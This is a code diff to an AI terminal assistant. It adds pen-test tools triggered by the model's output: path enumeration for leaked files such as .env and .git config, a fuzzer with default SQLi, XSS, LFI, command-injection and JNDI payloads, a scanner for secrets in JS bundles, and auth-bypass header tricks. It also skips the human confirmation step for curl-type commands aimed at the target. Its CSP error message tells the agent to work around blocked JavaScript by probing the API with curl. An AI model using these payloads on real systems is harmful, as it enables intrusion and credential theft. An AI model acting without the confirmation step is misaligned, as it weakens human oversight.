         r'|SET_REMINDER|SET_TIMER|LIST_REMINDERS|CANCEL_REMINDER'
         r'|LIGHTS_ON|LIGHTS_OFF|LIGHTS_COLOR|LIGHTS_BRIGHTNESS|LIGHTS_LIST'
         r'|BROWSER_PAGE|BROWSER_TABS|BROWSER_NAVIGATE|BROWSER_CLICK'
@@ -4523,20 +4362,52 @@ class AITerminal:
                 results.append("[LIVE BROWSER] NOT CONNECTED — Chrome extension offline.")
 
         # BROWSER_JS: <code> — execute JavaScript in the page
+        _js_csp_blocked = getattr(self, '_js_csp_blocked_url', None) == getattr(self.bridge, 'last_url', None)
         for m in re.finditer(r'^BROWSER_JS:\s*(.+)', text, re.MULTILINE):
             code = m.group(1).strip()
             if not _once(f"BROWSER_JS:{code[:50]}"):
                 continue
             has_tool = True
+            if _js_csp_blocked:
+                results.append(
+                    "[BROWSER JS] BLOCKED: JavaScript execution is blocked by Content Security Policy on this page. "
+                    "⚠️ Do NOT try more BROWSER_JS calls — they will all fail. "
+                    "Switch to: BROWSER_PAGE (read DOM), BROWSER_NAVIGATE to API endpoints, "
+                    "or RUN_CMD: curl -s <url> to probe the API directly."
+                )
+                continue
             if self.bridge.connected:
                 console.print(f"  [info]Running JS in Chrome...[/info]")
                 result = self.bridge.execute_js(code)
                 if result.get("error"):
-                    results.append(f"[BROWSER JS] Error: {result['error']}")
+                    err_msg = result['error']
+                    # Detect CSP / eval-blocked errors and prevent further JS retries this page
+                    is_csp = any(x in err_msg.lower() for x in [
+                        'content security policy', 'csp', 'eval', 'unsafe-eval',
+                        'refused to evaluate', 'refused to execute', 'script-src',
+                        'violates the following', 'blocked by', 'securitypolicyviolation'
+                    ])
+                    if is_csp:
+                        self._js_csp_blocked_url = getattr(self.bridge, 'last_url', '__csp_blocked__')
+                        results.append(
+                            f"[BROWSER JS] BLOCKED by Content Security Policy: {err_msg}\n"
+                            f"⚠️ CSP is blocking ALL JavaScript execution on this page. "
+                            f"Do NOT retry BROWSER_JS — every call will fail. "
+                            f"Switch immediately to: BROWSER_PAGE: (read the DOM), "
+                            f"BROWSER_NAVIGATE to API paths and read responses, "
+                            f"or RUN_CMD: curl -si <url> to probe headers and endpoints."
+                        )
+                    else:
+                        results.append(f"[BROWSER JS] Error: {err_msg}")
                 else:
+                    self._js_csp_blocked_url = None  # clear any stale block on success
                     results.append(f"[BROWSER JS] Result: {result.get('result', 'OK')}")
             else:
                 results.append("[LIVE BROWSER] NOT CONNECTED — Chrome extension offline.")
+
+        # ── Pen-test tools (only active when /attack <target> is armed) ───
+        if self.attack_target:
+            results.extend(self._handle_pentest_tools(text, _once))
 
         # ── Independent web browsing tools ────────────────────────────
         for m in re.finditer(r'^SEARCH:\s*(.+)', text, re.MULTILINE):
@@ -4760,12 +4631,39 @@ class AITerminal:
                 continue
             has_tool = True
             console.print(f"\n  [warning]Run:[/warning] {cmd}")
-            try:
-                confirm = self.session.prompt(
-                    [("class:prompt", "  Confirm? [y/N] ")], default="",
-                )
-            except (KeyboardInterrupt, EOFError):
-                confirm = ""
+
+            # Auto-confirm safe read-only pen-test commands targeting the attack_target host.
+            auto_ok = False
+            if self.attack_target:
+                try:
+                    target_host = urlparse(self.attack_target).netloc.lower()
+                except Exception:
+                    target_host = ""
+                # Whitelist: curl/wget/nc/dig/host/whois/openssl s_client read-only against target host
+                _safe_prefixes = ("curl ", "curl\t", "wget ", "wget\t",
+                                  "dig ", "host ", "whois ", "nslookup ",
+                                  "openssl s_client ", "openssl x509 ",
+                                  "echo ", "echo\t")
+                _danger = (" rm ", "rm -", "; rm", "&& rm", "mkfs", "dd if=",
+                           " > /dev/", "shutdown", "reboot", " curl http",
+                           "| sh", "| bash", "|sh", "|bash", "$(", "`",
+                           "sudo ", "chmod ", "chown ", "passwd", "useradd")
+                cmd_low = cmd.lower()
+                if (target_host and target_host in cmd_low
+                        and any(cmd_low.startswith(p) for p in _safe_prefixes)
+                        and not any(d in cmd_low for d in _danger)):
+                    auto_ok = True
+
+            if auto_ok:
+                console.print(f"  [muted](auto-approved: pen-test target host)[/muted]")
+                confirm = "y"
+            else:
+                try:
+                    confirm = self.session.prompt(
+                        [("class:prompt", "  Confirm? [y/N] ")], default="",
+                    )
+                except (KeyboardInterrupt, EOFError):
+                    confirm = ""
             if confirm.strip().lower() == "y":
                 try:
                     result = subprocess.run(
@@ -4774,7 +4672,7 @@ class AITerminal:
                     output = (result.stdout + result.stderr).strip()
                     if output:
                         console.print(f"  [muted]{output[:500]}[/muted]")
-                        results.append(f"[COMMAND OUTPUT]\n{output[:500]}")
+                        results.append(f"[COMMAND OUTPUT]\n{output[:2000]}")
                 except subprocess.TimeoutExpired:
                     console.print("  [error]Timed out[/error]")
             else:
@@ -4835,6 +4733,38 @@ class AITerminal:
             info = get_system_info()
             results.append(f"[SYSTEM] {info}")
             console.print(f"  [info]{info}[/info]")
+
+        # ── Calculator ────────────────────────────────────────────────
+        # CALCULATE: <python expression>
+        for m in re.finditer(r'^CALCULATE:\s*(.+)', text, re.MULTILINE):
+            expr = m.group(1).strip()
+            if not _once(f"CALCULATE:{expr}"):
+                continue
+            has_tool = True
+            import math as _math
+            _safe_globals = {
+                '__builtins__': {},
+                'abs': abs, 'round': round, 'min': min, 'max': max,
+                'sum': sum, 'int': int, 'float': float, 'pow': pow,
+                'sqrt': _math.sqrt, 'log': _math.log, 'log10': _math.log10,
+                'log2': _math.log2, 'exp': _math.exp,
+                'sin': _math.sin, 'cos': _math.cos, 'tan': _math.tan,
+                'asin': _math.asin, 'acos': _math.acos, 'atan': _math.atan,
+                'atan2': _math.atan2, 'degrees': _math.degrees, 'radians': _math.radians,
+                'pi': _math.pi, 'e': _math.e, 'tau': _math.tau,
+                'ceil': _math.ceil, 'floor': _math.floor, 'trunc': _math.trunc,
+                'hypot': _math.hypot, 'factorial': _math.factorial,
+                'gcd': _math.gcd, 'lcm': getattr(_math, 'lcm', None),
+                'comb': _math.comb, 'perm': _math.perm,
+            }
+            try:
+                result = eval(compile(expr, '<calc>', 'eval'), _safe_globals, {})
+                formatted = f"{result:.10g}" if isinstance(result, float) else str(result)
+                results.append(f"[CALCULATE] {expr} = {formatted}")
+                console.print(f"  [info]calc: {expr} = {formatted}[/info]")
+            except Exception as calc_err:
+                results.append(f"[CALCULATE] Error evaluating '{expr}': {calc_err}")
+                console.print(f"  [error]calc error: {calc_err}[/error]")
 
         # ── Reminders / Timers ────────────────────────────────────────
         # SET_REMINDER: <time_expr> | <label>
@@ -5099,6 +5029,393 @@ class AITerminal:
 
         return "\n\n".join(results) if results else ""
 
+    # ── Pen-test tools ─────────────────────────────────────────────────────
+
+    # Common paths to enumerate during recon (admin/api/debug/leaks)
+    _PENTEST_COMMON_PATHS = [
+        "/robots.txt", "/sitemap.xml", "/security.txt", "/.well-known/security.txt",
+        "/.env", "/.git/config", "/.git/HEAD", "/.svn/entries", "/.DS_Store",
+        "/admin", "/admin/", "/admin/login", "/administrator", "/wp-admin/",
+        "/login", "/signin", "/signup", "/register", "/auth", "/logout",
+        "/api", "/api/", "/api/v1", "/api/v2", "/api/users", "/api/user",
+        "/api/me", "/api/admin", "/api/auth", "/api/login", "/api/config",
+        "/api/health", "/api/status", "/api/debug", "/api/internal",
+        "/health", "/status", "/metrics", "/debug", "/debug/pprof",
+        "/server-status", "/phpinfo.php", "/info.php", "/test.php",
+        "/config", "/config.json", "/config.yml", "/swagger.json",
+        "/swagger-ui", "/swagger-ui.html", "/api-docs", "/graphql",
+        "/_next/static", "/_next/data", "/__nextjs_original-stack-frame",
+        "/actuator", "/actuator/health", "/actuator/env", "/actuator/heapdump",
+        "/.htaccess", "/web.config", "/composer.json", "/package.json",
+        "/yarn.lock", "/.npmrc", "/Dockerfile", "/docker-compose.yml",
+        "/backup", "/backup.zip", "/backup.tar.gz", "/dump.sql", "/db.sql",
+        "/console", "/_profiler", "/storage/logs", "/error_log",
+    ]
+
+    # Security headers we expect on a hardened production site
+    _SECURITY_HEADERS = {
+        "strict-transport-security": "Missing HSTS — enables downgrade attacks",
+        "content-security-policy": "Missing CSP — XSS payloads can execute",
+        "x-content-type-options": "Missing X-Content-Type-Options: nosniff — MIME sniffing",
+        "x-frame-options": "Missing X-Frame-Options — clickjacking risk (also check CSP frame-ancestors)",
+        "referrer-policy": "Missing Referrer-Policy — leaks referer to third parties",
+        "permissions-policy": "Missing Permissions-Policy — unrestricted browser features",
+        "cross-origin-opener-policy": "Missing COOP — Spectre / cross-window attacks",
+        "cross-origin-embedder-policy": "Missing COEP — cross-origin isolation gaps",
+    }
+
+    def _pentest_curl(self, url: str, method: str = "GET",
+                      data: Optional[str] = None,
+                      headers: Optional[dict] = None,
+                      cookies: Optional[str] = None,
+                      timeout: int = 8) -> dict:
+        """HTTP probe used by pen-test tools. Returns dict with status, headers, body."""
+        try:
+            req_headers = {
+                "User-Agent": "Nova-PenTest/2.0 (sanctioned red-team)",
+                "Accept": "*/*",
+            }
+            if headers:
+                req_headers.update(headers)
+            if cookies:
+                req_headers["Cookie"] = cookies
+            r = requests.request(
+                method, url, data=data, headers=req_headers,
+                timeout=timeout, allow_redirects=False, verify=True,
+            )
+            return {
+                "status": r.status_code,
+                "headers": dict(r.headers),
+                "body": r.text[:4000],
+                "size": len(r.content),
+                "redirect": r.headers.get("Location"),
+            }
+        except requests.exceptions.SSLError as e:
+            return {"error": f"SSL: {e}"}
+        except requests.exceptions.ConnectionError as e:
+            return {"error": f"Connection: {e}"}
+        except requests.exceptions.Timeout:
+            return {"error": "Timeout"}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _handle_pentest_tools(self, text: str, _once) -> list[str]:
+        """Process all PENTEST_* tool calls. Only invoked when attack_target is set."""
+        out: list[str] = []
+        target = self.attack_target
+        if not target:
+            return out
+        try:
+            target_host = urlparse(target).netloc
+            target_scheme = urlparse(target).scheme or "https"
+        except Exception:
+            return out
+
+        def _resolve(path_or_url: str) -> str:
+            """Accept a path or full URL — restrict to target host."""
+            p = path_or_url.strip()
+            if not p:
+                return target.rstrip("/") + "/"
+            if p.startswith("http://") or p.startswith("https://"):
+                if urlparse(p).netloc != target_host:
+                    return ""  # off-target — refuse
+                return p
+            if not p.startswith("/"):
+                p = "/" + p
+            return f"{target_scheme}://{target_host}{p}"
+
+        # PENTEST_RECON: — full passive recon on the target
+        if _once("PENTEST_RECON") and re.search(r'^PENTEST_RECON:', text, re.MULTILINE):
+            console.print(f"  [info]Running passive recon on {target_host}...[/info]")
+            lines = [f"[PENTEST RECON] target: {target}"]
+            # 1. Root request
+            r = self._pentest_curl(target)
+            if "error" in r:
+                lines.append(f"  ROOT: error: {r['error']}")
+            else:
+                lines.append(f"  ROOT: {r['status']} ({r['size']}B)")
+                # Tech detection
+                tech = []
+                for h in ("Server", "X-Powered-By", "X-AspNet-Version", "Via",
+                          "X-Generator", "X-Drupal-Cache", "X-Pingback"):
+                    if h in r["headers"]:
+                        tech.append(f"{h}: {r['headers'][h]}")
+                if tech:
+                    lines.append(f"  TECH: " + " | ".join(tech))
+                # Cookie analysis
+                sc = r["headers"].get("Set-Cookie", "")
+                if sc:
+                    flags = []
+                    if "secure" not in sc.lower():
+                        flags.append("⚠️ no Secure")
+                    if "httponly" not in sc.lower():
+                        flags.append("⚠️ no HttpOnly")
+                    if "samesite" not in sc.lower():
+                        flags.append("⚠️ no SameSite")
+                    lines.append(f"  COOKIES: {sc[:200]} {' '.join(flags) if flags else '(flags OK)'}")
+            # 2. Security headers
+            if "error" not in r:
+                missing = []
+                for h, why in self._SECURITY_HEADERS.items():
+                    if h not in {k.lower() for k in r["headers"].keys()}:
+                        missing.append(f"⚠️ {h} — {why}")
+                if missing:
+                    lines.append("  MISSING SECURITY HEADERS:\n    " + "\n    ".join(missing))
+                else:
+                    lines.append("  SECURITY HEADERS: all present ✓")
+            # 3. Common leak files
+            leaks = []
+            for path in ["/robots.txt", "/sitemap.xml", "/.env", "/.git/config",
+                         "/security.txt", "/.well-known/security.txt",
+                         "/swagger.json", "/api-docs", "/graphql"]:
+                rp = self._pentest_curl(target.rstrip("/") + path, timeout=4)
+                if "error" not in rp and rp["status"] == 200 and rp["size"] > 0:
+                    snippet = rp["body"][:120].replace("\n", " ")
+                    leaks.append(f"    {path} → 200 ({rp['size']}B) | {snippet}")
+            if leaks:
+                lines.append("  ACCESSIBLE PATHS:\n" + "\n".join(leaks))
+            else:
+                lines.append("  ACCESSIBLE PATHS: none of the common leak files exposed")
+            out.append("\n".join(lines))
+
+        # PENTEST_HEADERS: [url] — security header analysis on a single URL
+        for m in re.finditer(r'^PENTEST_HEADERS:\s*(.*)$', text, re.MULTILINE):
+            arg = m.group(1).strip()
+            url = _resolve(arg) if arg else target
+            if not url:
+                out.append(f"[PENTEST HEADERS] refused: off-target host")
+                continue
+            if not _once(f"PENTEST_HEADERS:{url}"):
+                continue
+            console.print(f"  [info]Header analysis: {url[:70]}[/info]")
+            r = self._pentest_curl(url)
+            if "error" in r:
+                out.append(f"[PENTEST HEADERS] {url}: {r['error']}")
+                continue
+            lines = [f"[PENTEST HEADERS] {url} → {r['status']}"]
+            for h, v in r["headers"].items():
+                lines.append(f"  {h}: {v[:160]}")
+            missing = [
+                f"⚠️ {h} — {why}"
+                for h, why in self._SECURITY_HEADERS.items()
+                if h not in {k.lower() for k in r["headers"].keys()}
+            ]
+            if missing:
+                lines.append("  --- MISSING ---\n  " + "\n  ".join(missing))
+            out.append("\n".join(lines))
+
+        # PENTEST_ENUM: [path1,path2,...]  — enumerate paths (default = common list)
+        for m in re.finditer(r'^PENTEST_ENUM:\s*(.*)$', text, re.MULTILINE):
+            arg = m.group(1).strip()
+            if not _once(f"PENTEST_ENUM:{arg[:80]}"):
+                continue
+            paths = [p.strip() for p in arg.split(",") if p.strip()] if arg else self._PENTEST_COMMON_PATHS
+            paths = paths[:80]  # cap
+            console.print(f"  [info]Enumerating {len(paths)} paths on {target_host}...[/info]")
+            hits = []
+            for p in paths:
+                if not p.startswith("/"):
+                    p = "/" + p
+                rp = self._pentest_curl(target.rstrip("/") + p, timeout=4)
+                if "error" in rp:
+                    continue
+                # Interesting: 200, 301/302 to non-/, 401/403 (exists but auth), 500
+                if rp["status"] in (200, 201, 204, 301, 302, 401, 403, 500):
+                    extra = ""
+                    if rp["status"] in (301, 302) and rp.get("redirect"):
+                        extra = f" → {rp['redirect']}"
+                    hits.append(f"  {rp['status']} {p} ({rp['size']}B){extra}")
+            if hits:
+                out.append(f"[PENTEST ENUM] {len(hits)} interesting paths:\n" + "\n".join(hits))
+            else:
+                out.append(f"[PENTEST ENUM] no interesting responses from {len(paths)} paths.")
+
+        # PENTEST_PROBE: <method> <path-or-url> [| body] [| Header: val; Header: val] [| cookies]
+        for m in re.finditer(r'^PENTEST_PROBE:\s*(.+)$', text, re.MULTILINE):
+            arg = m.group(1).strip()
+            if not _once(f"PENTEST_PROBE:{arg[:80]}"):
+                continue
+            parts = [p.strip() for p in arg.split("|")]
+            head = parts[0].split(None, 1)
+            if len(head) == 1:
+                method, path = "GET", head[0]
+            else:
+                method, path = head[0].upper(), head[1]
+            url = _resolve(path)
+            if not url:
+                out.append(f"[PENTEST PROBE] refused: off-target host")
+                continue
+            body = parts[1] if len(parts) > 1 else None
+            hdrs = {}
+            if len(parts) > 2 and parts[2]:
+                for hpair in parts[2].split(";"):
+                    if ":" in hpair:
+                        k, v = hpair.split(":", 1)
+                        hdrs[k.strip()] = v.strip()
+            cookies = parts[3] if len(parts) > 3 else None
+            console.print(f"  [info]Probe: {method} {url[:70]}[/info]")
+            r = self._pentest_curl(url, method=method, data=body, headers=hdrs, cookies=cookies)
+            if "error" in r:
+                out.append(f"[PENTEST PROBE] {method} {url}: {r['error']}")
+                continue
+            lines = [f"[PENTEST PROBE] {method} {url} → {r['status']} ({r['size']}B)"]
+            for h in ("Content-Type", "Set-Cookie", "Location", "Server",
+                      "X-Powered-By", "WWW-Authenticate", "Access-Control-Allow-Origin",
+                      "Access-Control-Allow-Credentials"):
+                if h in r["headers"]:
+                    lines.append(f"  {h}: {r['headers'][h][:200]}")
+            lines.append(f"  --- BODY (first 2000) ---\n  {r['body'][:2000]}")
+            out.append("\n".join(lines))
+
+        # PENTEST_FUZZ: <path> | <param>=<payload>[,<payload2>]
+        for m in re.finditer(r'^PENTEST_FUZZ:\s*(.+)$', text, re.MULTILINE):
+            arg = m.group(1).strip()
+            if not _once(f"PENTEST_FUZZ:{arg[:80]}"):
+                continue
+            if "|" not in arg:
+                out.append("[PENTEST FUZZ] usage: PENTEST_FUZZ: <path> | <param>=<payload1>,<payload2>")
+                continue
+            path_part, param_part = [p.strip() for p in arg.split("|", 1)]
+            if "=" not in param_part:
+                out.append("[PENTEST FUZZ] need param=payload")
+                continue
+            param, payloads_csv = param_part.split("=", 1)
+            payloads = [p.strip() for p in payloads_csv.split(",") if p.strip()]
+            if not payloads:
+                # Default OWASP payloads
+                payloads = [
+                    "' OR '1'='1", "\" OR \"1\"=\"1",  # SQLi
+                    "<script>alert(1)</script>", "\"><svg onload=alert(1)>",  # XSS
+                    "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",  # LFI
+                    "${jndi:ldap://nova.test/x}",  # log4shell-ish
+                    "; cat /etc/passwd", "| id", "`id`",  # command inj
+                    "{{7*7}}", "${7*7}",  # template inj
+                ]
+            console.print(f"  [info]Fuzzing {path_part} :: {param} ({len(payloads)} payloads)[/info]")
+            lines = [f"[PENTEST FUZZ] {path_part} param={param}"]
+            for pl in payloads[:25]:
+                joiner = "&" if "?" in path_part else "?"
+                fuzz_url = _resolve(f"{path_part}{joiner}{param}={quote(pl)}")
+                if not fuzz_url:
+                    continue
+                r = self._pentest_curl(fuzz_url, timeout=5)
+                if "error" in r:
+                    lines.append(f"  [{pl[:40]}] ERR: {r['error']}")
+                    continue
+                # Look for reflection / errors
+                reflected = pl in r["body"]
+                err_signals = any(s in r["body"].lower() for s in [
+                    "sql syntax", "mysql_fetch", "ora-", "psql:", "sqlite",
+                    "stack trace", "traceback", "exception", "warning:",
+                    "you have an error", "unterminated", "division by zero",
+                    "/etc/passwd", "root:x:", "[boot loader]",
+                ])
+                tag = []
+                if reflected: tag.append("REFLECTED")
+                if err_signals: tag.append("ERROR-LEAK")
+                lines.append(f"  [{r['status']}] {pl[:50]} ({r['size']}B) {' '.join(tag)}")
+            out.append("\n".join(lines))
+
+        # PENTEST_JS_BUNDLES: — extract JS bundle URLs from current target page and scan for secrets
+        if _once("PENTEST_JS_BUNDLES") and re.search(r'^PENTEST_JS_BUNDLES:', text, re.MULTILINE):
+            console.print(f"  [info]Scanning JS bundles on {target_host} for secrets...[/info]")
+            r = self._pentest_curl(target)
+            if "error" in r:
+                out.append(f"[PENTEST JS BUNDLES] root fetch: {r['error']}")
+            else:
+                # Extract <script src=...> URLs
+                src_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', r["body"])
+                resolved = []
+                for u in src_urls[:15]:
+                    if u.startswith("http"):
+                        if urlparse(u).netloc == target_host:
+                            resolved.append(u)
+                    elif u.startswith("/"):
+                        resolved.append(f"{target_scheme}://{target_host}{u}")
+                # Inline JS too
+                inline = re.findall(r'<script[^>]*>([^<]{50,})</script>', r["body"])
+                lines = [f"[PENTEST JS BUNDLES] target: {target}"]
+                lines.append(f"  Found {len(resolved)} same-origin scripts, {len(inline)} inline blocks")
+                # Secret patterns
+                patterns = {
+                    "AWS Access Key": r"AKIA[0-9A-Z]{16}",
+                    "Generic API key": r'(?i)api[_-]?key["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})["\']',
+                    "JWT": r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
+                    "Google API": r"AIza[0-9A-Za-z_\-]{35}",
+                    "Slack token": r"xox[abprs]-[A-Za-z0-9-]{10,}",
+                    "Private key": r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----",
+                    "Stripe key": r"sk_(?:live|test)_[A-Za-z0-9]{24,}",
+                    "Bearer in code": r'(?i)bearer\s+["\']?([A-Za-z0-9_\-\.]{20,})',
+                    "Hardcoded password": r'(?i)password["\']?\s*[:=]\s*["\']([^"\']{6,40})["\']',
+                    "Internal IP": r"\b(?:10\.\d{1,3}|192\.168|172\.(?:1[6-9]|2\d|3[01]))\.\d{1,3}\.\d{1,3}\b",
+                }
+                findings = []
+                # Scan inline first
+                for blob in inline:
+                    for name, pat in patterns.items():
+                        for hit in re.findall(pat, blob)[:3]:
+                            v = hit if isinstance(hit, str) else hit[0] if hit else ""
+                            findings.append(f"  ⚠️ [INLINE] {name}: {str(v)[:80]}")
+                # Fetch each bundle
+                for u in resolved[:10]:
+                    rb = self._pentest_curl(u, timeout=6)
+                    if "error" in rb or rb["status"] != 200:
+                        continue
+                    for name, pat in patterns.items():
+                        for hit in re.findall(pat, rb["body"])[:3]:
+                            v = hit if isinstance(hit, str) else hit[0] if hit else ""
+                            findings.append(f"  ⚠️ [{u.split('/')[-1][:40]}] {name}: {str(v)[:80]}")
+                if findings:
+                    lines.append("  SECRETS FOUND:\n" + "\n".join(findings[:50]))
+                else:
+                    lines.append("  No obvious secrets / tokens found in bundles.")
+                out.append("\n".join(lines))
+
+        # PENTEST_AUTH_BYPASS: <protected_path>
+        # Try common auth-bypass tricks: trailing dot, path traversal, X-Original-URL, etc.
+        for m in re.finditer(r'^PENTEST_AUTH_BYPASS:\s*(.+)$', text, re.MULTILINE):
+            path = m.group(1).strip()
+            if not _once(f"PENTEST_AUTH_BYPASS:{path}"):
+                continue
+            if not path.startswith("/"):
+                path = "/" + path
+            base = f"{target_scheme}://{target_host}"
+            console.print(f"  [info]Auth bypass tests on {path}[/info]")
+            tests = [
+                ("baseline", base + path, "GET", {}),
+                ("trailing dot", base + path + ".", "GET", {}),
+                ("trailing slash", base + path + "/", "GET", {}),
+                ("trailing %2f", base + path + "%2f", "GET", {}),
+                ("double slash", base + path.replace("/", "//", 1), "GET", {}),
+                ("path traversal", base + "/foo/../" + path.lstrip("/"), "GET", {}),
+                ("X-Original-URL", base + "/", "GET", {"X-Original-URL": path}),
+                ("X-Rewrite-URL", base + "/", "GET", {"X-Rewrite-URL": path}),
+                ("X-Forwarded-For 127", base + path, "GET", {"X-Forwarded-For": "127.0.0.1"}),
+                ("X-Real-IP 127", base + path, "GET", {"X-Real-IP": "127.0.0.1"}),
+                ("X-Originating-IP", base + path, "GET", {"X-Originating-IP": "127.0.0.1"}),
+                ("Host: localhost", base + path, "GET", {"Host": "localhost"}),
+                ("HTTP/1.0 verb POST", base + path, "POST", {}),
+                ("verb HEAD", base + path, "HEAD", {}),
+                ("verb OPTIONS", base + path, "OPTIONS", {}),
+                ("Referer admin", base + path, "GET", {"Referer": base + "/admin"}),
+            ]
+            lines = [f"[PENTEST AUTH BYPASS] target: {path}"]
+            baseline_status = None
+            for label, u, method, hdrs in tests:
+                rr = self._pentest_curl(u, method=method, headers=hdrs, timeout=5)
+                if "error" in rr:
+                    lines.append(f"  {label}: ERR {rr['error']}")
+                    continue
+                if label == "baseline":
+                    baseline_status = rr["status"]
+                tag = ""
+                if baseline_status and baseline_status in (401, 403) and rr["status"] == 200:
+                    tag = "  ⚠️⚠️ BYPASS — baseline denied, this returned 200"
+                lines.append(f"  {label}: {rr['status']} ({rr['size']}B){tag}")
+            out.append("\n".join(lines))
+
+        return out
+
     # ── Stream response ───────────────────────────────────────────────────
 
     _TOOL_PATTERN = re.compile(
@@ -5108,6 +5425,8 @@ class AITerminal:
         r'|LIGHTS_ON|LIGHTS_OFF|LIGHTS_COLOR|LIGHTS_BRIGHTNESS|LIGHTS_LIST'
         r'|BROWSER_PAGE|BROWSER_TABS|BROWSER_NAVIGATE|BROWSER_CLICK'
         r'|BROWSER_TYPE|BROWSER_KEY|BROWSER_SELECT_ALL|BROWSER_FOCUS|BROWSER_READ_SELECTION|BROWSER_JS'
+        r'|PENTEST_RECON|PENTEST_HEADERS|PENTEST_ENUM|PENTEST_PROBE|PENTEST_FUZZ'
+        r'|PENTEST_JS_BUNDLES|PENTEST_AUTH_BYPASS'
         r'|NEWS|MORNING_BRIEFING|SCENE'
         r'|SPOTIFY_PLAY|SPOTIFY_PAUSE|SPOTIFY_SKIP|SPOTIFY_VOLUME|SPOTIFY_NOW'
         r'|PI_SSH|PI_HEALTH|INDEX_PROJECT|SEARCH_CODE'
@@ -5197,6 +5516,7 @@ class AITerminal:
             CFG, self.memory, self.reasoning, self.agent_mode,
             bridge_connected=self.bridge.connected,
             bridge_port=self.bridge.actual_port,
+            attack_target=self.attack_target,
         )
 
         api_messages = [{"role": "system", "content": sys_prompt}]
@@ -5212,6 +5532,7 @@ class AITerminal:
         start = time.time()
         max_tool_loops = 15  # allow deep multi-step research
         loop_count = 0
+        stagnant_loops = 0  # consecutive loops where tools only produced errors
         all_responses = []
 
         # ── Tool loop: AI responds → tools execute → results fed back → AI continues ──
@@ -5246,6 +5567,29 @@ class AITerminal:
                     if loop_count > max_tool_loops:
                         console.print("  [warning]Tool loop limit reached[/warning]")
                         break
+                    # Stagnation detection: all bracketed result lines are errors/blocked
+                    _error_markers = ("[BROWSER JS] Error:", "[BROWSER JS] BLOCKED", "NOT CONNECTED",
+                                      "[BROWSER NAVIGATE] Error:", "[BROWSER CLICK] Error:",
+                                      "[PENTEST PROBE] refused", "ERR Connection", "ERR Timeout",
+                                      "[PENTEST HEADERS] refused")
+                    _result_lines = [l.strip() for l in tool_results.splitlines()
+                                     if re.match(r'^\[', l.strip())]
+                    _all_errors = bool(_result_lines) and all(
+                        any(e in l for e in _error_markers) for l in _result_lines
+                    )
+                    if _all_errors:
+                        stagnant_loops += 1
+                    else:
+                        stagnant_loops = 0
+
+                    stagnation_note = ""
+                    if stagnant_loops >= 3:
+                        stagnation_note = (
+                            f"\n\n⛔ STAGNATION DETECTED: The last {stagnant_loops} tool calls all failed. "
+                            f"You are looping with no progress. STOP calling tools. "
+                            f"Summarize what you found so far and give {CFG['owner']} your final answer now."
+                        )
+
                     # Feed results back and let AI continue
                     tool_msg = (
                         f"TOOL OUTPUT (this is the ONLY real data — everything below came from actual tools):\n\n"
@@ -5254,6 +5598,7 @@ class AITerminal:
                         f"Do NOT repeat or rephrase data you generated before the tools ran — that was hallucinated.\n"
                         f"If you need more data, use more tools. Otherwise give {CFG['owner']} your final answer.\n"
                         f"If asked to open something in the browser, use BROWSER_NAVIGATE: <real_url_from_above>"
+                        f"{stagnation_note}"
                     )
                     api_messages.append({"role": "assistant", "content": full_response})
                     api_messages.append({"role": "user", "content": tool_msg})
@@ -5278,7 +5623,9 @@ class AITerminal:
                 r'|LIGHTS_ON|LIGHTS_OFF|LIGHTS_COLOR|LIGHTS_BRIGHTNESS|LIGHTS_LIST'
                 r'|BROWSER_PAGE|BROWSER_TABS|BROWSER_NAVIGATE|BROWSER_CLICK'
                 r'|BROWSER_TYPE|BROWSER_KEY|BROWSER_SELECT_ALL|BROWSER_FOCUS'
-                r'|BROWSER_READ_SELECTION|BROWSER_JS):[^\n]*\n?',
+                r'|BROWSER_READ_SELECTION|BROWSER_JS'
+                r'|PENTEST_RECON|PENTEST_HEADERS|PENTEST_ENUM|PENTEST_PROBE'
+                r'|PENTEST_FUZZ|PENTEST_JS_BUNDLES|PENTEST_AUTH_BYPASS):[^\n]*\n?',
                 '',
                 self.last_response,
                 flags=re.MULTILINE,
